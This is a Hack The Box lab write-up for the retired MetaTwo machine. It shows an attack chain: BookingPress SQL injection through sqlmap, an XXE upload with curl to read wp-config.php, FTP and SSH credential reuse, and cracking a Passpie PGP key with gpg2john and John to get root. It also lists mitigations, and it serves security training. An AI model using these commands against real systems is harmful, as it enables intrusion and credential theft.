---
machine: MetaTwo
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, wordpress, sqli, xxe, ftp, passpie]
---

# MetaTwo — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

WordPress runs the BookingPress plugin, vulnerable to an unauthenticated SQLi that leaks the admin hash. Panel access enables an XXE to read `wp-config.php` and FTP credentials; the FTP server holds a script with SSH access. The root password is stored in Passpie and recovered by cracking its PGP key.

## Recon

```bash
nmap -Pn -sCV -p21,22,80 <IP>
```

- Ports: `21/tcp` FTP, `22/tcp` SSH and `80/tcp` HTTP.
- Services: WordPress with BookingPress, FTP and SSH.
- Technologies: WordPress, MySQL, PHP, XML, Passpie and PGP.

## Enumeration

- `metatwo.htb` running WordPress and BookingPress.
- Version vulnerable to CVE-2022-0739.
- FTP with a mail-sending script.
- User `jnelson` and a `.passpie` directory.

## Foothold

The BookingPress SQLi extracts the admin hash; crack it and log in to `wp-admin`. Upload XML with an external entity to read `wp-config.php`, obtain FTP credentials, and use the script on FTP to recover the SSH password.

```bash
wpscan --url http://metatwo.htb --enumerate vp
sqlmap -u "http://metatwo.htb/wp-admin/admin-ajax.php" \
  --data="action=bookingpress_front_get_category_booking_1&category_id=1" --batch
# Log in to wp-admin and use XXE to read wp-config.php
curl -s -b cookies.txt -F "file=@xxe.xml" http://metatwo.htb/wp-admin/admin-ajax.php
ftp metatwo.htb
ssh jnelson@metatwo.htb
```

## Lateral movement

FTP credentials lead to the mail script; that script contains the `jnelson` password, reused for SSH.

## Privilege escalation

Passpie stores the root password encrypted with a PGP key. Extract the hash with `gpg2john`, crack it with John and use `passpie` to recover the credential.

```bash
ls -la ~/.passpie
gpg2john ~/.passpie/.keys > passpie.hash
john --wordlist=/usr/share/wordlists/rockyou.txt passpie.hash
passpie copy --to stdout
su root
```

## Evidence

- Admin hash extracted through SQLi.
- `wp-config.php` read via XXE and FTP credentials.
- Root password recovered from Passpie.

## Lessons learned

- An outdated plugin can compromise all of WordPress.
- XXE still appears in import and media flows.
- Local password managers are an escalation target.

## Mitigation and detection

- Patch WordPress and plugins; enforce WAF and least privilege.
- Disable external entities in every XML parser.
- Rotate FTP/SSH credentials and protect Passpie with a strong passphrase.

## References

- [0xdf — MetaTwo](https://0xdf.gitlab.io/2023/04/29/htb-metatwo.html)
- [IppSec — MetaTwo](https://www.youtube.com/watch?v=Alx5KQWq7ZM)
- [Hack The Box — MetaTwo](https://app.hackthebox.com/machines/metatwo)
